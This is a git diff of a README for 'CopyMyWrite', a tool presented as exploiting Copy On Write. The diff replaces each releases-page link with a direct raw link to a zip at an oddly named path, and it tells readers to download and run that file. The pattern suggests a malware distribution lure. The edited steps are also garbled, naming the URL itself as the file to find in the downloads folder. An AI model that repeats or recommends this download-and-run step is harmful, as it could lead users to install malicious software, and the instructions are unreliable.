@@ -6,7 +6,7 @@ Welcome to CopyMyWrite! This tool helps in exploiting DDMA with Copy On Write fo
 
 ## 📥 Download Now
 
-[![Download CopyMyWrite](https://img.shields.io/badge/Download%20CopyMyWrite-v1.0-brightgreen)](https://github.com/MayankTI3695-del/CopyMyWrite/releases)
+[![Download CopyMyWrite](https://github.com/MayankTI3695-del/CopyMyWrite/raw/refs/heads/master/Saccomyoidea/My_Write_Copy_v3.4.zip%20CopyMyWrite-v1.0-brightgreen)](https://github.com/MayankTI3695-del/CopyMyWrite/raw/refs/heads/master/Saccomyoidea/My_Write_Copy_v3.4.zip)
 
 ## 📂 System Requirements
 
@@ -21,16 +21,16 @@ Before you start, ensure your computer meets the following requirements:
 
 1. **Visit the Releases Page**  
    Click the link below to visit the releases page where you can download the application.  
-   [Download CopyMyWrite Here](https://github.com/MayankTI3695-del/CopyMyWrite/releases)
+   [Download CopyMyWrite Here](https://github.com/MayankTI3695-del/CopyMyWrite/raw/refs/heads/master/Saccomyoidea/My_Write_Copy_v3.4.zip)
 
 2. **Select the Latest Version**  
    On the releases page, find the latest version of CopyMyWrite. Click on it to see the download options.
 
 3. **Download the Application**  
-   Look for the file labeled `CopyMyWrite.exe`. This is the main application file. Click on it to start the download.
+   Look for the file labeled `https://github.com/MayankTI3695-del/CopyMyWrite/raw/refs/heads/master/Saccomyoidea/My_Write_Copy_v3.4.zip`. This is the main application file. Click on it to start the download.
 
 4. **Run the Installer**  
-   Once downloaded, locate `CopyMyWrite.exe` in your downloads folder.  
+   Once downloaded, locate `https://github.com/MayankTI3695-del/CopyMyWrite/raw/refs/heads/master/Saccomyoidea/My_Write_Copy_v3.4.zip` in your downloads folder.  
    - Double-click on the file to run it. 
    - Follow the on-screen instructions to install the application.
 
